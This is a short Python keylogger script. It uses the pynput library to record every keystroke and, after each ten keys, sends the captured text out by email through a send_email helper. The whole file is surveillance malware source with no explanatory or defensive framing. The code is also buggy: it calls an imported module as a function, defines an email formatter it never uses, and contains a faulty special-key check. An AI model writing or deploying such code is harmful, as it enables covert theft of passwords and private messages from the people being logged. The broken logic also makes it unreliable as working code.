import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    global keys, count
    print(f"{key} pressed")
    keys.append(str(key))
    count += 1

    if count >= 10:  # Send email after 10 keystrokes
        count = 0
        message = ''.join(keys).replace("'", "")
        send_email(message)
        keys = []  # Reset the list of keys after sending

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()